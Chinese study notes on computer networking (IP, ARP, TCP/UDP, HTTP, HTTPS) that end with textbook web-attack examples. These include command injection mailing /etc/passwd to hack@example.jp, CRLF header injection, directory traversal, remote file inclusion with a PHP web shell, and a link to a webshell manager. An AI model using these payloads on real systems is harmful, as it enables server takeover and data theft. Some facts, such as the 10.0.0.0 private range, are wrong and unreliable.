## 计算机网络（笔记）

#### P2P

对等链接方式 peer-to-peer，区别C/S，通信时不区分谁是服务请求方谁是提供方，只要都运行了P2P软件即可，双方都可以下载对方已经存储在硬盘中得共享文档。

#### ADSL

ADSL（Asymmetric Digital Subsriber Line）技术是一种不对称数字用户线实现宽带接入互连网的技术，是用数字技术对现有的模拟电话用户线进行改造。

#### 以太网MAC层

MAC层的硬件地址，又称物理地址或MAC地址，一种48位字符串。MAC地址是在网卡——适配器中的地址，如果适配器坏了，换了个新的，那么MAC地址也会改变。和这台电脑在哪，局域网在哪都无关。

如果一台计算机配有多个网卡，则会有多个地址，准确的说这种地址是某个接口的标识符。

#### 虚拟局域网

利用以太网交换机可以实现虚拟局域网VLAN，在IEEE802.1Q 标准中定义如下：VLAN是由一些局域网网段构成的与物理位置无关的逻辑组，这些网段具有某些共同的需求。每个VLAN的帧都有一个明确的标识符，指明发送这个帧的计算机属于哪一个VLAN。本质上是局域网给用户提供的一种服务。

#### 网际协议IP

网际协议IP是TCP/IP体系中两个最主要的协议之一，俄式互联网标准协议之一。

与IP协议配套使用的还有三个协议

> 地址解析协议ARP（Address Resolution Protocol）
网际控制报文协议ICMP（Internet Control Message Protocol）
网际组管理协议IGMP（Internet Group Management Protocol)

> 物理层使用中间设备叫**转发器**
数据链路层使用设备叫**网桥/桥接器**
网络层使用中间设备叫**路由器**
网络层以上使用**网关**，用来连接两个不兼容的系统需要在高层进行协议的转换。

由于网关比较复杂，使用较少，因此讨论网络互连时，都是指用路由器进行网络互连和路由选择。路由器本质上是一台专用来互联网中进行路由选择的专用计算机。

对于主机或路由来说IP地址都是32位的二进制代码（00010101），为了方便书写，在数字间加一个点（点分十进制记法），如192.168.0.1

#### 常用的三种类别IP地址

**A类地址：**（1-126）

A类地址的网络号字段占1个字节，只有7位可用，可指派的网络号是2^7  - 2 = 126个，减2的原因：IP地址中全）表示this，为保留地址，意思是本网络。网络号127（即01111111）保留作为本地软件**回环测试**地址，此第hi的IP数据报永远不会出现在网络上，因为它不是一个网络地址。

A类地址的主机号占3个字节，因此每个A类网络中最大主机数为2^24-2 ,减2原因：全0的主机号字段表示 该IP地址是“本主机”所连接到的**单个网络地址**（如，一主机的IP地址为5.6.7.8，则该主机所在的网络地址就是5.0.0.0）。而全1表示**所有的**，因此全1的主机号字段表示该网络上所有的主机。占整个IP地址空间的50%

**B类地址**（128-191）

B类地址的网络字段号有2个字节。前面两位固定为（1 0 ）也就是128.0，128.0.0.0是不指派的，可指派的最小网络地址是128.1.0.0，占总IP的25%

**C类地址**（192-223）

C类地址有3个字节的网络号字段。最前面3位是（1 1 0），还有21位可以进行分配。C类网络地址192.0.0.0.0也是不指派的，可指派的C类最小网络地址是192.0.1.0，占总IP的12.5%。

**IP地址重要特点：**

IP地址管理机构在分配IP地址时只分配网络号，主机号由得到该网络号的单位自行分配。

路由器仅根据目的的主机所连接的网络号来转发分组，而不考虑目的主机号。

一个网络是指具有相同网络号net-id的主机的集合。

224-239组播地址

240-254科研地址

#### 地址解析协议ARP

应用中：已知一个机器（主机/路由器）的IP地址，需要找出其相应的硬件地址。ARP就是解决这个问题的。

> ARP协议：是通过网络层使用的IP地址，解析出在数据链路层使用的硬件地址

ARP解决方法是：在主机ARP高速缓存中存放一个IP地址到硬件地址的映射表，并且这个映射表还经常动态更新（新增或超时删除）。【ARP缓存中存放本局域网上的各个主机和路由器的IP地址到硬件地址的映射表】

**主机如何知道这些地址？**

当主机A 要向本局域网上的某台主机B发送IP数据报时， 就先在其ARP高速缓存中查看有无主机B的IP地址。 如有， 就在ARP高速缓存中查出其对应的硬件地址， 再把这个硬件地址写入MAC帧， 然后通过局域网把该MAC帧发往此硬件地址。

也有可能查不到B的IP，有可能B刚入网，或A刚加点，缓存为空，此时A自动运行ARP按照以下步骤找出B的硬件地址。

1） A的ARP进程在本局域网上广播发送一个ARP请求分组。【我的IP是。。。MAC地址是。。。我想知道B的主机的MAC。。。】（路由器上可以查看对应MAC地址）

2） 在本局域网上的所有主机上运行的ARP进程都收到此ARP请求分组

3） B的IP和ARP请求分组中要查询的IP一致，并接收ARP请求，向A发送ARP响应，并在响应中写入自己B的MAC地址。【ARP响应内容为：我IP是。。我的硬件地址是。。】（arp请求是广播，响应是单播）

4） A收到B的ARP响应后，在自己的ARP缓存中写入B的IP地址到硬件地址的映射。

当A在发送ARP请求时，就顺便把自己的IP地址到MAC地址的映射写入ARP请i去中，方便对方也保存在其ARP缓存中，就不用B再请求A了。

ARP对保存在缓存中的每一个映射地址项目都设置了**生存时间**

> **ARP是解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题**

**ARP四种典型情况**

1） 发送方是主机（如H1)，要把IP数据报发送到同一个网络上的另一台主机（如H2)。这时H1发送ARP请求分组（在网1上广播），找到目的主机H2的硬件地址。

2） 发送方是主机（如H1)，要把IP数据报发送到另一个网络上的一台主机（如H3或H4）这时H1发送ARP请求分组（在网1上广播），找到网1上的一个路由器R1的硬件地址。 剩下的工作由路由器R1来完成。R1要做的事情是下面的(3)或(4)。

3） 发送方是路由器（如R1），要把IP数据报转发到与R1连接在同一个网络（网2））上的主机（如H3）。这时R1发送ARP请求分组（在网2上广播），找到目的的主机H3的硬件地址。

4） 发送方是路由器（如R1），要把IP数据报转发到网3上的一台主机（如H4）。H4与R1不是连接在同一个网络上。 这时R1发送ARP请求分组（在网2上广播），找到连接在网2上的一个路由器R2的硬件地址。剩下的工作由这个路由器R2来完成。

#### IP数据报格式

在TCP/IP标准中，各种数据格式常常以32位（4字节）为**单位**来描述

一个IP数据报由首部和数据两部分组成。首部的前一部分是固定长度20字节。后一部分是可选字段，长度可变。

首部固定部分各个字段：

1） 版本。占4位，指IP协议版本，一般都是IPv4，或者IPv6

2） 首部长度。占4位，可表示的最大十进制数值是15。首部长度字段锁表示的数的**单位**是32位字（4字节）【即最大首部长度位60字节4*15】

3） 区分服务。占8位，用来获得更好的服务。一般不使用这个字段。

4） 总长度。指首部和数据之和的长度，单位为字节总长度字段为16位，所以数据报的最大长度位2^16-1 = 65535字节。

> 在IP层下面的每一种数据链路层协议都规定了一个数据帧中的数据字段的最大长度——最大传送单元MTU，当一个IP数据报封装成链路层的帧时，此数据包的总长度（首部加上数据部分）一定不能超过MTU值，如以太网规定MTU为1500字节，过长的数据报会进行分片处理。
为此IP协议规定，在互联网中所有的主机和路由器，必须能够接受长度不超过576字节的数据报（上层数据512字节+IP首部60字节+4字节富余量=576）
分片时，数据报首部中的总长度字段是指分片后的每一个分片的首部长度与该分片的数据长度的总和。

5） 标识（identification）。占16位，IP软件在存储器中维持一个计数器，每产生一个数据报，计数器就加1，并将此值赋给标识字段。但这个“标识”并不是序号，因为IP是无连接服务，数据报不存在按序接收的问题。当数据报由于长度超过网络的MTU而必须分片时，这个标识字段的值就被复制到所有的数据报片的标识字段中。相同的标识字段的值使分片后的各数据报片最后能正确地重装成为原来的数据报。

6） 标志（flag）。占3位，只有前两位有意义。标志字段中的最低位记为MF (More Fragment)。MF =1即表示后面 ”还有分片 ” 的数据报。MF=0表示这已是若干数据报片中的最后一个。标志字段中间的一位记为DF（Dont Fragment）不能分片，只有当DF = 0时才允许分片。

7） 片偏移。占13位。片偏移指出：较长的分组在分片后，某片在原分组中的相对位置。相对于用户数据字段的起点，该片从何开始。片偏移以8个字节位偏移单位。每个分片的长度一定是8字节（64位）的整数倍。

8） 生存时间TTL。占8位，表示数据报在网络中的寿命。单位时跳数，指明数据报在互联网中至多可经过多少个**路由器**。显然最大值为255（8位），如果设为1，就表示这个数据报只能在本局域网中传送，在被转发之前会-1变为0，就被丢弃了。

9） 协议。占8位，指数据报携带的数据为何种协议，以便目的主机的IP层直到应将数据给哪个协议处理。

|协议名|ICMP|IGMP|IP|TCP|EGP|IGP|UDP|IPv6|ESP|OSPF|
|-|-|-|-|-|-|-|-|-|-|-|
|字段值|1|2|4|6|8|9|17|41|50|89|


10） 首部检验和。占16位，这个字段只检验数据报的首部，但不包括数据部分。因为数据报每经过一个路由器，路由器都要重新计算一i啊首部检验和。

11） 源地址。占32位

12） 目的地址。占32位

#### 划分子网(subnetting)

使两级IP地址变为三级IP地址的一种方法。

1. 一个拥有许多物理网络的单位（指工作单位），可将所属的物理网络划分为若干个**子网**。划分子网属于单位内部事情。本单位以外的网络看不见这个网络是由多少个子网组成，此单位对外仍然表现为一个网络。
2. 划分子网的方法是从网络的主机号借用若干位作为子网号，同时主机号也就相应减少了同样的位数。于是两级IP地址在本单位内部就变为三级IP：网络号、子网号、主机号。

    > IP地址~= {<网络号>,<子网号>,<主机号>}

#### 子网掩码

从IP数据报的首部无法看出源主机或目的主机所连接的网络是否进行了子网划分。本身没有任何子网的信息。此时需要使用子网掩码。

路由器把三级IP地址的子网掩码和收到的数据报的目的IP地址逐位相与（AND），就可以得出子网地址。

CIDR地址块将IP地址分为两部分，<网络前缀><主机号>，使用/表示网络前缀所占的位数

ICMP报文是IP层协议，是互联网标准协议，有两种，1：ICMP差错报告报文，2：ICMP询问报文。

PING（Packet InterNet Groper）分组网间探测，用来测试两台主机之间的连通性。PING使用了ICMP回送请求与回送回答报文。PING是应用层直接使用网络层ICMP的一个例子，没有通过运输层的TCP/UDP。

tracert命令（跟踪）。发送目的主机一连串数据报，送到路由器时丢弃（TTL -1 原理），这样能得到所有经过的路由器地址。

127.0.0.1也叫回环地址，计算机---交换机----路由器---互联网----其他服务器

路由器中有网关，配置网关才可和连接外界，没配置时只能和内网通信。

#### DNS

如访问www.baidu.com时，首先访问DNS服务器，解析域名，将域名转为IP地址，再请求。

DNS一般会用自动获取最近的，一般都是三大运营商提供。

#### 互联网的路由选择协议

自治系统AS时在单一技术管理下的一组路由器。一个AS对其他AS表现出的是**一个单一的和一致的路由选择策略**

互联网把路由选择协议分两大类

1. 内部网关协议IGP（Interior Gateway Protocol)，在一个 自治系统内部使用的路由选择协议，而这与在互联网中的其他自治系统选用什么路由选择协议无关。目前这类用的最多，如RIP和OSPF
2. 外部网关协议EGP（External...) 若源主机和目的主机处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用EGP将路由选择信息传递到另一个自治系统中。

自治系统之间的路由选择也叫**域间路由选择**，在自治系统内部的路由选择叫**域内路由选择**

#### 路由器的构成

路由器的任务是**转发分组**，

> 从路由器某个输入端口收到的分组，按照分组要去的目的地（目的网络），把该分组从路由器的某个合适的输出端口转发给下一跳路由器。下一跳路由器也按照这种方法处理分组，直至该分组达到终点。路由器的转发分组正是网络层的主要工作

路由选择部分核心构件是选择处理机，根据所选定的路由选择协议构造出路由表，同时经常或定期的和相邻路由器交换路由信息，而不断地更新和维护路由表。

分组转发由：交换结构，一组输入端口和一组输出端口（端口即硬件接口）三部分组成。

交换结构（交换组织）：根据转发表，对分组进行处理，将某个输入端口进入的分组从一个合适的输出端口转发出去。本身是一种网络，可以看作在“路由器中的网络”

输入端口中的查找和转发功能在交换功能中是最重要的，为了使交换功能分散化，往往把复制的转发表放在每一个输入端口中。路由选择处理机负责对各转发表的副本进行更新，副本也叫**影子副本**

#### IPv6

v6将协议数据单元PDU称为分组，而不是v4的数据报。

变化如下

1. 更大的地址空间，128位地址。
2. 扩展的地址层次结构。
3. 灵活的首部格式。v6和v4的首部不兼容。路由器对扩展首部不进行处理
4. 改进的选项。v6的首部长度固定，选项放在有效载荷中。(v4选项固定，放在首部可变部分中)
5. 允许协议继续扩展。
6. 支持即插即用（自动配置）。v6不用DHCP。
7. 支持资源的预分配。支持实时视像等要求保证一定带宽和时延的应用。
8. v6首部改位8字节对齐。v4是4字节对齐

v6数据报由两大部分：**基本首部**、**有效载荷**

有效载荷允许有0个或多个扩展首部，所有的扩展首部并不属于v6数据报的首部。

1. 版本，指明协议版本
2. 通信量类：区分不同的v6数据报的类别或优先级
3. 流标号：流：指互联网络上从特定源点到特定终点的一系列数据报（如实时音频/视频传输），在这个流所经过的路径上的路由器都保证指明的服务质量。
所有属于同一个流的数据报都有同样的流标号。因此流标号对实时音视频传送特别有用。非实时设置0即可。
4. 有效载荷长度：指明v6数据报基本首部以外的字节数（所有扩展首部都算在有效载荷之内）
5. 下一个首部：相当于v4的协议字段或可选字段，当没有扩展首部时，下一个首部字段和v4的协议字段一样。
6. 跳数限制：最大255跳
7. 源地址：发送端IP
8. 目的地址：接收端IP

v6数据报的目的地址可以是以下三种基本类型地址之一。

1. 单播：点对点通信。
2. 多播：一对多通信，v6没有用广播的术语，而将广播看作多播的一个特例。
3. 任播：终点是一组计算机，但数据报只交付其中的一个，通常是距离最近的一个。

v6把实现v6的主机和路由器均成为【结点】，一个结点可能会使用多条链路与其他结点连接

v6地址使用**冒号十六进制记法**（colon hex），允许把数字前的0省略（如0000 -> 0 ）

零压缩：一串零可以用一堆冒号取代。如 FF05:0:0:0:0:0:0:B3	-->	FF05::B3 （一个地址只能有一次零压缩）

注意：0:0:0:0:0:0:128.10.2.1	后四位是点分十进制，冒号之间是16位，也就是4个.=2个:

#### IPv4向IPv6过渡

**双线协议**：指在完全过度到v6之前，使一部分主机装有双协议栈，此类主机同时具有v4和v6地址。

使用**域名系统DNS**来查询目的主机采用哪种地址。DNS返回v4就用v4，反v6用v6。

但可能会丢失v6中的首部中的某些字段。如流标号。

**隧道技术**：zaiv6数据报要进入v4时，把v6数据报封装成v4数据报，使整个v6数据报变成了v4数据报的数据部分。要使双协议栈的主机知道v4数据报里封装的数据是一个v6数据报的话，就必须把v4的首部协议字段的值设置为41（表示数据报的数据部分使v6数据报）

!

IP多播，如视频服务器多播视频节目。如果单播会向每台主机发送一个副本。而多播只需要一次。在路由器转发分组时，把收到的分组复制成3个副本，分别向下个路由器各转发一个副本...能转发多播的路由器叫多播路由器。

多播地址只能用于目的地址，不能用于源地址。多播组的标识符就是IP地址中的D类地址。

IGMP网际组管理协议：是让连接在本地局域网上的多播路由器直到本局域网上是否有主机参加或退出了某个多播组。

多播路由选择协议：多播过程中多播组的成员是动态变化的，随时有主机加入或者离开。多播路由选择实际上就是要找出以源主机为根节点的**多播转发树**，在树上，每一个多播路由器向树的叶节点方向转发收到的多播数据报，但在多播转发树上的路由器不会收到重复的多播数据报（即多播数据报不应在互联网中兜圈子）

以上两个协议来控制网络间参与多播的主机。

总之：多播数据报可以由没有加入多播组的主机发出，也可以通过没有组成员接入的网络。

在转发多播数据报时使用了三种方法。

1. 洪泛与剪除，适合较小的多播组。采用反向路径广播RPB
2. 隧道技术，适用于多播组的位置在地理上很分散的情况。（和v6的封装类似，IP中的IP）
3. 基于核心的发现技术。是对每一个多播组指定一个核心路由器。

#### VPN和NAT

**虚拟专用网VPN**

机构内部使用的计算机配置由机构自行分配的IP地址，仅在本机构有效的IP（本地地址），而不需要向互联网管理机构申请全球唯一IP（全球地址）

在互联网中的所有路由器，对目的地址是**专用地址**的数据报一律不进行转发。

以下三个专用地址块的指派并无变化

1. 10.0.0.0到10.25.255.255（24位块）
2. 172.16.0.0到172.31.255.255（20位块）
3. 192.168.0.0到192.168.255.255（16位块，192.168.0.0/16）

采用这样的专用IP地址的互连网络成为专用互联网或**本地互联网**，也叫专用网，这种IP地址叫可重用地址。

一个机构分布在世界各地的部分如果要交换信息的话，一般有两种方法

1. 租用电信公司的通信线路为本机构专用，方法简单，租金太高，一般不考虑。
2. 利用公共的互联网作为本机构各专用网之间的通信载体，这样的转往又称为**虚拟专用网VPN**(Virtual Private Network)

通过公共互联网时必须有保密要求，所有通过互联网传送的数据都必须加密。一个机构要构建自己的VPN就必须为它的每一个场所购买专门的硬件和软件，进行配置，使每一个场所的VPN系统都知道其他场所的地址。

一个机构的VPN需要有某些外部机构参加进来，这样的VPN叫外联网。

**远程接入VPN**：在外地工作的员工通过拨号接入互联网，而驻留在员工个人电脑中的VPN软件可以在员工的个人电脑和公司的主机之间建立VPN隧道，之间的通信也是保密。

**网络地址转换NAT**

在专用网内部的一些主机分配到了本地IP地址，但又想和互联网上的主机通信（不加密），即使用NAT。

需要在专用网连接到互联网的路由器上安装NAT软件，NAT路由器至少有一个有效的外部全球IP地址，这样在NAT路由器上将其他本地地址转换成全球IP地址，和互联网连接。

B发送数据给NAT路由，路由会根据NAT地址转换表，找到A主机。现在婵宫的NAT转换表会加上端口号。

!

显然通过NAT路由器的通信必须由专用网内的主机发起。不然找不到专用网的主机。所以不能充当服务器。

使用端口号的NAT也叫**网络地址与端口号转换**NAPT

多协议标记交换MPLS：MPLS利用面向连接技术，使每个分组携带一个叫做label标记的小证书，当分组到达交换机时，交换机读取分组的标记，并用标记值来检索分组转发表。这样就比查找路由表来转发快得多。

特点：1）支持面向连接的服务质量 2）支持流量工程，平衡网络负载。3）有效的支持VPN

标记交换路由器的转发表：入接口，入标记，出接口，出标记。

#### 运输层

复用：是指在发送方不同的应用进程都可以使用同一个运输层协议传送数据（加上适当的首部）。

分用：是指接收方的运输层在剥去报文的首部后能够把这些数据正确交付目的应用进程。

TCP/IP运输层的两个主要协议都是互联网的正式标准，用户数据报协议UDP（User Datagram Protocol）和传输控制协议TCP（Transmission Control Protocol）

UDP在传送数据之前**不需要先建立连接**，远端主机的运输层收到UDP报文后不需要给任何确认，是一种不可靠交付。

TCP面向连接的服务，TCP不提供广播或多播服务。

**端口**

一般指运输层使用的协议端口号

服务器端使用的端口号：
一类叫做熟知端口号或**系统端口号**，0~1023（可在www.iana.org查到，IANA把这些端口号指派给了TCP/IP最重要的一些应用程序，让所有的用户都知道。

另一类叫做等级端口号，1024~49151。这类端口号必须在IANA按照规定的手续等级，以防重复使用。

客户端使用的端口号： 49152~65535。又叫短暂端口号，通信结束后，客户端口号就消失了，以供其他客户进程使用。

**UDP**

特点：无连接，不保证可靠交付，**面向报文**，**没有拥塞控制**，支持一对一、一对多、多对一和多对多的交互通信，UDP的首部开销小（只有8字节，TCP为20字节）。

面向报文：应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文，因此应用程序必须选择合适大小的报文。

没有拥塞控制：因此网络出现的拥塞不会使源主机的发送速率降低。（对某些实时应用很重要，入IP电话实时视频会议）要求源主机以恒定的速率发送数据，并且允许发生拥塞时丢失一些数据，但不允许数据有太大的时延。

UDP首部格式，4个字段每个字段2个字节。

源端口：不需要时可全0。

目的端口：在终点交付报文时必须使用。

长度：UDP用户数据报长度，最小8（仅有首部）

校验和：检测UDP用户数据报在传输中是否有错，有错就丢弃。

伪首部是用来计算校验的。

**TCP**

点对点，无差错，不丢失，不重复，按序到达、面向字节流

**提供全双工通信**：允许通信双方的应用进程在任何时候都能发送数据。TCP两端都设有发送缓存和接收缓存，用来临时存放通信数据。发送时，应用程序在把数据传送给TCP的缓存后，就可以做自己的事，而TCP在合适的时候把数据发送出去，接收时，TCP把收到的数据放到缓存中，上层应用在合适的时候读取缓存中的数据。

TCP并不关心应用进程一次把多长的报文送到TCP的缓存中，而是根据对方给出的窗口值和当前网络拥塞的程度来决定一个报文段应包含多少个字节（UDP发送的报文长度是应用进程给出的）。如果进程传到TCP缓存的数据块太长，TCP可以把它划分短一些再传送，如果进程一次只发来一个字节，TCP也可以等待积累有足够多的字节后再构成报文段发送出去。

TCP连接有两个端点，这种端点叫**套接字Socket**，端口号拼接到IP地址即构成了Socket。（如192.3.4.5:8080）

每一条TCP连接唯一地被通信两端的两个端点（即两个Socket）所确定即

> TCP连接 :: = {socket1, socket2} = {(IP1:port1)，(IP2：port2)}

同一个IP地址可以有多个不同的TCP连接，同一个端口号也可以出现多个不同的TCP连接中。

同一个名词socket可表示多种不同意思。

停止等待协议

分三种情况，1. 无差错情况。2.出现差错。3.确认丢失和确认迟到

A在发送完一个分组后必须暂时保留已发送的分组的副本。分组和确认分组都必须进行编号，为了明确哪个发送的收到了确认，哪个分组还没确认。

信道利用率，等待停止协议的优点是简单，但信道利用率太低。改用连续ARQ协议和滑动窗口协议。

但累积确认有缺点：不能向发送方反映出接收方已经正确收到的所有分组的信息。

**TCP报文段首部**

确认号=N时，则到序号N-1为止的所有数据都已正确收到。

#### HTTP返回状态码

|状态码|类别|原因短语|
|-|-|-|
|1XX|Informational|接受的请求正在处理|
|2XX|Success|请求正常处理完毕|
|200|OK|正常处理|
|204|No Content|处理成功，没有资源返回|
|206|Partial Content|部分内容请求|
|3XX|Redirection|需要进行附加操作以完成请求|
|301|Moved Permanently|永久性重定向，资源转移新URI|
|302|Found|临时重定向|
|303|See Other|该URI已更新，应使用GET请求新的|
|304|Not Modified|资源找到，但为符合条件请求|
|307|Temporary Redirect|临时重定向，不会从POST变为GET|
|4XX|Client Error|服务器无法处理请求|
|400|Bad Request|请求报文语法错误|
|401|Unauthorized|HTTP认证（登录）失败|
|403|Forbidden|无权访问|
|404|Not Found|找不到资源，或者委婉拒绝|
|5XX|Server Error|服务器处理请求出错|
|500|Internet Server Error|服务器内部错误|
|503|Service Unavailable|服务器过载或停机维护|


#### 与HTTP协作的Web服务器

一台Web服务器可搭建多个独立域名的web网站，也可以作为通信路径上的中转服务器提升传输效率

**DNS**：域名服务器，域名通过DNS服务映射到IP地址（域名解析）之后访问目标网站。

**代理**：一种有转发功能的应用程序，是服务器和客户端的中间人。

转发时需要附加Via首部字段以标记处经过的主机信息。

**网关**：网关是转发其他服务器通信数据的服务器，就像服务器的大门。确保服务器外层安全

**隧道**：相隔较远的客户端和服务器之间进行中转，并保持通信连接的应用。比如SSL等加密手段通信，目的是安全通信。

**资源缓存**：当代理服务器从源服务器返回响应时，会保存一份资源副本在缓存服务器上。有效期过后会重新请求。缓存也可以保存在客户端，同样有有效期。

（FTP传输文件协议起源1973，比HTTP要早）

首部字段一览P80

通过指定首部字段Cache-Control可以操作缓存工作机制。

首部类型：HTTP1.1通用首部字段，请求首部字段，响应首部字段，实体首部字段

请求首部字段添加Host来找到一台服务器上的不同域名的虚拟主机。

User-Agent：传达浏览器种类和用户代理名称

Expires：会将资源失效日期告知客户端

#### HTTPS

> http不足：
通信使用明文，内容可能被窃听；
不验证通信方身份，可能遭遇伪装；
无法证明报文完整，可能被篡改

抓包（Packet Capture）如Wireshark，嗅探器（Sniffer）

将通信加密，通过SSL（Secure Socket Layer安全套接层）或TLS（Transport Layer Security安全层传输协议）组合使用，加密HTTP通信内容。HTTP+SSL=HTTPS，HTTP+加密+认证+完整性保护=HTTPS

通信过程：HTTP====SSL====TCP====IP（本来HTTP====TCP====IP）

通信时身份，权限，伪装。

通过权威三方机构的证书可以确定对方，通信前确认服务器的证书。

HTTP传输时可能被拦截并篡改内容，这种攻击叫**中间人攻击**

相互交换密钥的公开密钥加密技术，SSL采用公开密钥加密。加密算法公开，密钥保密。

**对称加密**：加密和解密使用同一个密钥。产生密钥发送问题。

**非对称加密**：使用两把密钥的公开密钥加密，公钥私钥。公钥随意发布，私钥只用于发送者。发送密文一方使用公钥加密密文，接收方用私钥解密。（如RSA，但速度很慢）

**HTTPS采用混合加密机制**：在交换密钥时使用公钥加密，建立通信后则使用对称的共享密钥加密方式。（先非对称，ok后再对称）

为了确保公钥是真实的公钥，使用三方机构的公开密钥证书。

EV SSL证书：证明服务端背后企业是否存在。

**客户端证书**：对客户端认证。（如网银采用客户端证书，不仅要用户提供账号和密码，还要客户端证书，来确认用户是否从特定的终端访问网银），但，只要获得了证书计算机的使用权限，也就意味着有了客户端证书使用权限。

OpenSSL：自认证证书。

#### 认证

HTTP/1.1使用认证方式：

- BASIC认证（基本认证），id密码用Base64编码（未加密），被窃听后失去安全性
- DIGEST认证（摘要认证）：客户端发送认证要求，服务器发送质询码，客户端发送响应码（质询计算相应），防窃听，不防伪装。
- SSL客户端认证：客户端安装证书，客户端请求时会发送证书，服务器验证证书，领取证书内客户端的公钥，开始HTTPS通信（SSL需要费用）
- FormBase认证（基于表单认证）：如注册，登录等，通过web应用程序来认证。
多半都是表单认证。

使用Cookie管理Sesssion，客户端发送ID和密码，服务器发送SessionID的Cookie，客户端再请求时带着有sessionId的cookie，认证成功。sessionId可以被拦截窃听

WebSocket协议特点：

- 推送功能，客户端不用频繁请求更新。
- 减少通信量，由于是长连接只有一次
- 握手请求，需要用到Upgrade首部字段，告知服务器通信协议发生改变

#### 网络安全

**主动攻击**：如SQL注入攻击web站点

**被动攻击**：设置陷阱，如跨站脚本攻击（XSS），跨站点请求伪造。

通过被动攻击，攻击者可以访问企业内部网络

**输出值转义不完全引发的安全漏洞**

XSS影响：利用虚假输入表单骗取用户信息；利用脚本窃取用户的Cookie，帮助攻击者发送恶意请求；显示伪造的文章或图片。

**XSS示例**：如一个登录页www.xxx.com/login?id=xxx 攻击者将此URI改为带有script的URI，www.xxx.com/login?id=xxx>var.....并诱导用户请求，之后数据便会流向script中的攻击者设置的uri中

**对用户Cookie窃取攻击**：同样通过script，P217

**SQL注入攻击**：比如uri传参时，传入name=abc'--

sql拼接后就会注释掉后面的判断。所以采用#{方式防止}

**OS命令注入攻击**：通过web应用执行非法的操作系统命令攻击。只要在能调用shell函数的地方就有被攻击风险

如发送邮件，;在OS命令中，会被解析为分割多个执行命令的标记。

```javascript
open(MAIL, "| /usr/sbin/sendmail $adr");
程序中的open函数调用sendmail命令发送邮件，将$adr地址改为如下
; cat /etc/passwd | mail hack@example.jp
程序接受该值，构成一下的命令组合，将passwd发送到hack邮箱了
| /usr/sbin/sendmail ; cat /etc/passwd | mail hack@example.jp
```

**HTTP首部注入攻击**，通过在相应首部字段内插入换行，添加任意响应首部或主体的攻击，被动攻击

如：在Location后添加%0D%0A（解析为换行符）Set-Cookie：SID=123456，这样就能操作Cookie，或者说插入任意字段。

**HTTP相应截断攻击**：通过两个连续的%0D%0A%0D%0A，并排插入后就可以伪造body。本质上还是首部注入攻击的一种。

如：Set-Cookie：UID=%0D%0A%0D%0A我是攻击者，伪造网页<!--

将之前的页面对应的首部字段和主体部分注释了。

**邮件首部注入攻击**：攻击者通过向邮件首部To或Subject内任意添加非法内容发起攻击。

如：攻击者将如下数据作为邮件地址发起请求。%0D%0A代表换行符，之后就可Bcc给追加发送。

使用两个连续的换行符就可能篡改文本内容发送

```powershell
bob@hackr.jp%0D%0ABcc:user@example.com
bob@hackr.jp%0D%0A%0D%0ATest Message
```

**目录遍历攻击**：通过查询字段指定某个文件名，再绕过文件读取指定文件。

```html
http://eample.com/read.php?log=0401.log
攻击者设置如下字段发起请求，就可以访问passwd文件了
http://eample.com/read.php?log=../../etc/passwd
```

**远程文件包含漏洞**：指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取后，就可运行任意脚本的攻击，主要是PHP的漏洞。

如：

```bash
原URL
http://exa.com/foo.php?mod=news.php
脚本如下
$modname = $-GET['mod'];
include($modname);
攻击者URL发送
http://exa.com/foo.php?mod=http://hackr.jp/cmd.php&cmd=1s
攻击者http://hackr.jp/cmd.php脚本,执行了Web服务器文件及目录信息的ls命令
<? system($_GET['cmd']) ?>
```

#### 设计或设置引发的漏洞

**强制浏览**：如文件目录，推测文件名文件目录，备份文件(.cgi，.bak)，经认证才可显示的文件（如URL图片等）

**不正确的错误消息处理**：不要在浏览器抛出详细异常，会给攻击者机会。（如，该账号已经注册过，攻击者就知道改账号注册过，从而对该账号进行破解等，应提示未登陆失败，认证错误等模糊字样）

**开放重定向**：跳转时url被攻击者替换，钓鱼网站

```powershell
如
http://example.com/?redirect=http://hackr.jp
```

**Session管理漏洞**：攻击者通过某种手段拿到了用户的SessionId，非法使用此id伪装用户来攻击。

sessionId获取途径：非正规的生成发发推测SessionId；窃听或XSS攻击盗取；通过Session固定攻击强行获取。

如：用户认证过的SID存入Cookie中，攻击者通过XSS，设置脚本调用document.cookie窃取Cookie信息，再将用户的SID放入自己Cookie中伪装成用户。

**固定Session攻击**：强制用户使用攻击者设置的SessionId，属于被动攻击。

如：1，攻击者访问登录页；2、服务器返回一个SID此时是未认证状态；3、攻击者将2中返回的URL设为陷阱诱导用户去登录；4、用户登录后SID变为已认证状态，攻击者登录。

**跨站点请求伪造（Cross-SIte Request Forgeries，CSRF）**：攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

如：1、用户通过认证，得到Cookie：sid=123；2、攻击者再留言板上发表含有恶意代码的评论；3、用户触发，此时用户会发送你好（攻击者设定）

#### **其他安全**

**密码破解**：1、通过密码试错（穷举法，字典攻击，很多用户喜欢在很多网站使用同一套id和密码）；2、对已加密密码破解（入侵系统，获得加密或散列处理的密码数据）

还有sql注入逃避认证，跨站脚本攻击窃取密码等。

从加密的数据中导出铭文通常由以下方法

- 穷举法字典攻击：攻击者需要先拿到散列值，调用散列函数MD5等对候选密码进行散列后和拿到的散列值比较。
- 彩虹表：是由明文密码和对应散列值构成的一张数据库表（和字典差不多）[https://freerainbowtables.com/](https://freerainbowtables.com/)
- 拿到密钥：使用公钥加密情况
- 加密算法的漏洞：只限于web开发者独立实现的加密算法。

**点击劫持**：利用透明的按钮或链接做成陷阱，覆盖web页，诱导用户点击。又称界面伪装（UI Redressing）

如：钓鱼网站会将用户注销功能页面作为透明层覆盖在钓鱼页面上，用户点击钓鱼网站时等同点击了注销功能。

**DoS攻击（Denial of Service attack）**：服务停止攻击，包括web网站，网络设备，服务器等。

攻击方式：集中利用访问请求造成资源过载；通过安全漏洞使服务停止。

多台计算机发起的Dos叫DDoS（Distributed），攻击常利用感染病毒的计算机作为攻击者的攻击跳板。

**后门程序**：开发阶段作为debug调用的后门；开发者为自身利益植入的后门；攻击者通过某种方法设置的后门。

可通过监视进程和通信状态发现后门，但很难发现。





## 网络安全

靶机：OWASP

中国菜刀：资源管理软件

[https://codeload.github.com/raddyfiy/caidao-official-version/zip/refs/heads/master](https://codeload.github.com/raddyfiy/caidao-official-version/zip/refs/heads/master)

Linux一些命令

> dhclient -r eth0		（释放dh客户端，目标网卡）
dhclient -v eth0 		（获取）
